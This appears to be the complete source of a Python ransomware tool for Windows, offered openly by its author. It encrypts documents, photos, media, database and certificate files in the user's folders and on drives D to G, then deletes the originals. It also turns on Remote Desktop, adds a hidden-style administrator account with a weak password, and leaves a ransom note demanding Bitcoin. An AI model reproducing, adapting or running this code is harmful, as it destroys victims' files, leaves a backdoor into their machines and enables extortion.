#!/usr/bin/python
# -*- coding: utf-8 -*-
# coded by Bingo 
# twitter: @ly88321 
# https://github.com/ly88321/crypt0


from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from sys import stdout
import base64, os,winreg
rmsbrand = 'Admin'
email_con = 'XXXXX@mail.com'
btc_address = 'XXXXXXXXXXXXXXXX'
userhome = os.path.expanduser('~')
key = "aGFja2xhYg=="
class colors:
        def __init__(self):
                self.blue = "\033[94m"
                self.red = "\033[91m"
                self.end = "\033[0m"
cl = colors()



print(cl.red+"""

\t
\t               |
\t               |
\t          -----+------        -----------
\t               |                                   
\t               |
\t    )                                           (
\t    \ \                                       / /
\t     \ |\                                   / |/
\t      \|  \                               /   /
\t       \   |\         --------          / |  /
\t        \  |  \_______________________/   | /
\t         \ |    |      |      |      |    |/
\t          \|    |      |      |      |    /
\t           \____|______|______|______|___/



\t             By: @ly88321
\t          https://github.com/ly88321/crypt0

"""+cl.end)



def getkey(password):
	hasher = SHA256.new(password)
	return hasher.digest()



def write(word):
	stdout.write(word+"                                         \r")
	stdout.flush()
	return True



def encrypt(key, filename):
	chunksize = 64*1024
	outputFile = str(filename)+".hacklab"
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = Random.new().read(16)

	encryptor = AES.new(key, AES.MODE_CBC, IV)
	try:
		with open(filename, 'rb') as infile:
			with open(outputFile, 'wb') as outfile:
				outfile.write(filesize.encode('utf-8'))
				outfile.write(IV)

				while True:
					chunk = infile.read(chunksize)

					if len(chunk) == 0:
						break 
					elif len(chunk) % 16 != 0:
						chunk += b' ' * (16 - (len(chunk) % 16))

					outfile.write(encryptor.encrypt(chunk))
	except IOError:
		pass

def get_desktop():
	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
	return winreg.QueryValueEx(key, "Desktop")[0]
def write_instruction(dir, ext):
	try:
		files = open(dir + '\\README_FOR_DECRYPT.' + ext, 'w')
		files.write('! ! ! OWNED BY ' + rmsbrand + ' ! ! !\r\n\r\nAll your files are encrypted by ' + rmsbrand + ' with strong chiphers.\r\nDecrypting of your files is only possible with the decryption program, which is on our secret server.\r\nTo receive your decryption program send $10 USD Bitcoin to address: ' + btc_address + '\r\nContact us after you send the money: ' + email_con + '\r\n\r\nJust inform your Key ID and we will give you next instruction.\r\nYour personal Key ID: ' + key + '\r\n\r\nAs your partner,\r\n\r\n' + rmsbrand + '')
	except:
		pass
def create_remote_desktop():
	try:
		os.system('REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f')
		os.system('net user ' + rmsbrand + ' 123456 /add')
		os.system('net localgroup administrators ' + rmsbrand + ' /add')
	except:
		pass
#change this path to your path
k = Path(get_desktop())
ca = Path(userhome + '\\Desktop\\')
cb = Path(userhome + '\\Pictures\\')
cc = Path(userhome + '\\Documents\\')
cd = Path(userhome + '\\Videos\\')
ce = Path(userhome + '\\Music\\')
d = Path('D:\\')
e = Path('E:\\')
f = Path('F:\\')
g = Path('G:\\')
#print(k,ca,cb,cc,cd,ce,d,e,f,g)
#change this key with your key, remember the key must be base64 encode


list_f = []


#extensions list
extensions = ['txt',
              'php',
              'pl',
              'm4a',
              'wma',
              'avi',
              'wmv',
              'csv',
              'mp3',
              'mp4',
              'm3u',
              'flv',
              'js',
              'css',
              'rb',
              'png',
              'jpeg',
              'p7c',
              'p7b',
              'p12',
              'pfx',
              'pem',
              'crt',
              'cer',
              'pef',
              'ptx',
              'dcr',
              'cr2',
              'crw',
              'bay',
              'sr2',
              'srf',
              'arw',
              '3fr',
              'dng',
              'jpg',
              'cdr',
              'indd',
              'ai',
              'eps',
              'pdf',
              'pdd',
              'psd',
              'dbfv',
              'mdf',
              'wb2',
              'rtf',
              'wpd',
              'dxg',
              'xf',
              'dwg',
              'pst',
              'accdb',
              'mdb',
              'pptm',
              'pptx',
              'ppt',
              'xlk',
              'xlsb',
              'xlsm',
              'xlsx',
              'xls',
              'wps',
              'docm',
              'docx',
              'doc',
              'sql',
              'html',
              'htm',
              '3gp',
              'srt',
              'cpp',
              'mid',
              'mkv',
              'mov',
              'asf',
              'mpeg',
              'vob',
              'mpg',
              'fla',
              'swf',
              'wav',
              'gpg',
              'aes',
              'bak',
              'bmp',
              'cmd',
              'class',
              'jar',
              'java',
              'asp',
              'vbs',
              'asm',
              'MYI',
              'MYD',
              'SQLITEDB',
              'SQLITE3',
              'mml',
              'sxm',
              'otg',
              'slk',
              'xlw',
              'xlt',
              'xlm',
              'xlc',
              'dotm',
              'dotx',
              'xml',
              'key',
              'c',
              'h',
              'bat',
              'py']# ['jpg', 'png', 'jpeg','txt', 'mp3', "mp4", 'zip', 'rar', 'iso','exe' ]
#f = raw_input("the files format> ")

for extension in extensions:
	try:
		searchea = list(ca.glob('**/*.{}'.format(extension)))
		searcheb = list(cb.glob('**/*.{}'.format(extension)))
		searchec = list(cc.glob('**/*.{}'.format(extension)))
		searched = list(cd.glob('**/*.{}'.format(extension)))
		searchee = list(ce.glob('**/*.{}'.format(extension)))
		searche2 = list(d.glob('**/*.{}'.format(extension)))
		searche3 = list(e.glob('**/*.{}'.format(extension)))
		searche4 = list(f.glob('**/*.{}'.format(extension)))
		searche5 = list(g.glob('**/*.{}'.format(extension)))
		for File in searchea + searcheb + searchec + searched + searchee + searche2 + searche3 + searche4 + searche5:
			File = str(File)
			#print(File)
			if File.endswith(".hacklab"):
				pass
			else:
				#x = x.split("/")[-1]
				list_f.append(File)
				#print(x)
				
	except OSError:
		print("you must be root !")


for i in list_f:
	file_name = i.split("\\")[-1]
	file_path = i.replace(file_name, "")

	word = cl.blue+"Encryption: "+cl.end+str(file_name)
	write(word)
	os.chdir(file_path)
	encrypt(getkey(base64.b64decode(key)), file_name)
	try:
		os.remove(file_name)
	except OSError:
		pass
create_remote_desktop()
print("\n* Done *")
write_instruction(get_desktop(), 'txt')
os.startfile(get_desktop()+ '\\README_FOR_DECRYPT.txt')
